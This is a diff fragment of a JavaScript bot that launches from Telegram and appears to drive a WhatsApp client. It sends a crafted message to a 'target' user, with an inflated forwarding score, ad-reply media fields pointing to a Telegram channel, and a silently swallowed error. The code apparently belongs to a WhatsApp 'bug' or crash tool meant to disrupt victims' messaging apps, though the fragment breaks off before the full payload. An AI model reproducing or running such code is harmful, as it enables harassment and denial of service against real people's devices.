+          expiryTimestamp: null,
+          contextInfo: {
+            remoteJid: " S ",
+            isForwarded: true,
+            forwardingScore: 9999,
+            externalAdReply: {
+              title: " S ",
+              body: " S ",
+              mediaType: "VIDEO",
+              renderLargerThumbnail: true,
+              previewTtpe: "VIDEO",
+              sourceUrl: "https://t.me/PipopOfficial",
+              mediaUrl: "https://t.me/PipopOfficial",
+              showAdAttribution: true
+            }
+          }
+        }
+      },
+      {
+        participant: { jid: target },
+        quoted: null,
+        userJid: null,
+        messageId: null
+      }
+    );
+
+    await bydaah.sendNode(main);
+  } catch {}
+}
+
+
 bot.launch({ dropPendingUpdates: true })
     .then(() => {
         console.log("𝕾𝖔𝖚𝖑 𝖛𝟙 𝖌𝖊𝖓𝟚 | @bydaa");
